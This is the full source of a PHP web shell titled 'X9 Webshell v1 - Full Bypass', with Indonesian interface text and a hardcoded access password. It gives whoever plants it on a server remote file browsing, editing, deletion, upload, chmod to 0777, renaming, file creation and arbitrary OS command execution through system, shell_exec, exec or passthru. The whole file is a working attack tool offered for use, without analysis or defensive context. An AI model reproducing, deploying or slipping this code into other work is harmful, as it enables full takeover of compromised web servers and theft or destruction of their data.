<?php
@error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);

$pass = "x9666"; 

if (!isset($_REQUEST['p']) || $_REQUEST['p'] !== $pass) {
    http_response_code(403);
    die("Forbidden");
}

$dir = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
if (!is_dir($dir)) $dir = getcwd();
chdir($dir);

function w($f, $c) { return @file_put_contents($f, $c) !== false ? "Sukses" : "Gagal"; }
function r($f) { return @file_get_contents($f); }
function del($f) { return is_dir($f) ? @rmdir($f) : @unlink($f); }

// Action Handler
if (isset($_GET['del']))  { echo del($_GET['del']) ? "Deleted<br>" : "Gagal delete<br>"; }
if (isset($_GET['chmod'])) {
    $file = $_GET['chmod'];
    $perm = $_POST['perm'] ?? '0777';
    echo @chmod($file, octdec($perm)) ? "CHMOD $perm sukses pada $file" : "Gagal chmod";
}
if (isset($_POST['rename'])) {
    $old = $_POST['old'];
    $new = $_POST['new'];
    echo @rename($old, $new) ? "Rename sukses: $old → $new" : "Gagal rename";
}

echo "<title>X9 Webshell v1 - Full Bypass</title>";
echo "<h1>X9 Webshell Full - Anti 0KB </h1>";
echo "<p>Current Path: <b>" . getcwd() . "</b> | <a href='?p=$pass&d=" . dirname($dir) . "'>[Up]</a></p>";

// File & Folder List
echo "<table border=1 cellpadding=5 cellspacing=0 width=100%>";
echo "<tr><th>Nama</th><th>Size</th><th>Permission</th><th>Action</th></tr>";
foreach (scandir($dir) as $f) {
    if ($f == "." || $f == "..") continue;
    $fullpath = $dir . "/" . $f;
    $size = is_dir($fullpath) ? "[DIR]" : @filesize($fullpath);
    $perm = substr(sprintf('%o', fileperms($fullpath)), -4);
    
    echo "<tr>";
    echo "<td><a href='?p=$pass&d=$fullpath'>$f</a></td>";
    echo "<td>$size</td><td>$perm</td>";
    echo "<td>
        <a href='?p=$pass&edit=$fullpath'>Edit</a> |
        <a href='?p=$pass&del=$fullpath' onclick=\"return confirm('Delete?')\">Del</a> |
        <a href='?p=$pass&chmod=$fullpath'>Chmod</a> |
        <a href='?p=$pass&rename=$fullpath'>Rename</a>
    </td>";
    echo "</tr>";
}
echo "</table>";

// === UPLOAD ANTI 0KB ===
if (isset($_FILES['up'])) {
    $target = $_POST['target'] ? $_POST['target'] : $_FILES['up']['name'];
    $tmp = $_FILES['up']['tmp_name'];
    if (move_uploaded_file($tmp, $target) || file_put_contents($target, file_get_contents($tmp))) {
        echo "<font color=green>Upload OK → $target</font><br>";
    } else echo "<font color=red>Upload gagal</font><br>";
}

// === CHMOD FORM ===
if (isset($_GET['chmod'])) {
    $file = $_GET['chmod'];
    echo "<h3>CHMOD → $file</h3>";
    echo "<form method=post>
        <input type=hidden name=p value='$pass'>
        <input type=hidden name=chmod value='$file'>
        Permission: <input name=perm value='0777' size=6>
        <input type=submit value='Apply CHMOD'>
    </form>";
}

// === RENAME FORM ===
if (isset($_GET['rename'])) {
    $file = $_GET['rename'];
    echo "<h3>Rename → $file</h3>";
    echo "<form method=post>
        <input type=hidden name=p value='$pass'>
        <input type=hidden name=rename value='1'>
        <input type=hidden name=old value='$file'>
        New Name: <input name=new value='" . basename($file) . "' size=50>
        <input type=submit value='Rename'>
    </form>";
}

// === CREATE FILE ===
if (isset($_POST['createfile'])) {
    echo w($_POST['fname'], $_POST['fcontent']) . "<br>";
}

// === CREATE FOLDER ===
if (isset($_POST['mkdir'])) {
    echo @mkdir($_POST['mkdirname'], 0777, true) ? "Folder dibuat<br>" : "Gagal buat folder<br>";
}

// === COMMAND EXECUTION ===
if (isset($_POST['cmd'])) {
    echo "<pre style='background:#000;color:#0f0;padding:10px;'>";
    $cmd = $_POST['cmd'];
    if (function_exists('system')) system($cmd);
    elseif (function_exists('shell_exec')) echo shell_exec($cmd);
    elseif (function_exists('exec')) { exec($cmd, $o); print_r($o); }
    elseif (function_exists('passthru')) passthru($cmd);
    echo "</pre>";
}

?>

<hr>
<h3>Upload File (Anti 0KB)</h3>
<form method="post" enctype="multipart/form-data">
<input type="hidden" name="p" value="<?= $pass ?>">
<input type="file" name="up">
Target: <input name="target" placeholder="kosong = nama asli">
<input type="submit" value="Upload">
</form>

<h3>Create New File</h3>
<form method="post">
<input type="hidden" name="p" value="<?= $pass ?>">
Filename: <input name="fname" value="new.php"><br>
<textarea name="fcontent" rows="10" cols="90"></textarea><br>
<input type="submit" name="createfile" value="Create File">
</form>

<h3>Create Folder</h3>
<form method="post">
<input type="hidden" name="p" value="<?= $pass ?>">
Folder: <input name="mkdirname">
<input type="submit" name="mkdir" value="Create Folder">
</form>

<h3>Command Execution</h3>
<form method="post">
<input type="hidden" name="p" value="<?= $pass ?>">
<input name="cmd" value="id" size="80">
<input type="submit" value="Execute">
</form>

<p><a href="?p=<?= $pass ?>&cmd=whoami">Test Command</a></p>
